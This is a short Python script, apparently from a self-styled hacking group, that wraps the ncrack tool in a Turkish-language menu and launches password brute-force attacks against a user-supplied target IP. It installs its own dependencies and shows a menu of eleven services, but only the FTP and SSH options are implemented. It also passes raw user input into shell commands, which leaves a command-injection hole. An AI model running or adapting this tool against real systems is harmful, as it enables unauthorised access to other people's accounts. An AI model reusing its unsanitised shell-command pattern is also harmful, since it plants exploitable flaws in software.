import os
os.system("apt-get install figlet")
os.system("apt-get install ncrack")
os.system("clear")

print(""" 
  ▔▔▔▔▔╲
▕╮╭┻┻╮╭┻┻╮╭▕╮╲
▕╯┃╭╮┃┃╭╮┃╰▕╯╭▏
▕╭┻┻┻┛┗┻┻┛ ▕ ╰▏
▕╰━━━┓┈┈┈╭╮▕╭╮▏
▕╭╮╰┳┳┳┳╯╰╯▕╰╯▏
▕╰╯┈┗┛┗┛┈╭╮▕╮┈▏
Code by: EkremCan
Team: RedHackTeam
Telegram: @RedHackOrg


1) FTP
2) SSH
3) TELNET
4) HTTP
5) SMB
6) RDP
7) VNC
8) SIP
9) REDİTS
10) POSTGRESQL
11) MYSQL

Bu Saldırı Ekrem Can Tarafındann Kodlandırılmıştır.
""")
islemno = input("İşlem No Giriniz : ")
hedefip = input("Hedef İp Giriniz : ")
kullaniciadi = input("Kullanıcı Adı Dosya Yolu : ")
sifre = input("Sifrelerin Bulunduğu Dosya Yolu : ")
if(islemno == "1"):
    os.system("ncrack -p 21 -U " + kullaniciadi + " -P " + sifre + " " + hedefip)
if(islemno == "2"):
    os.system("ncrack -p 22 -U " + kullaniciadi + " -P " + sifre + " " + hedefip)
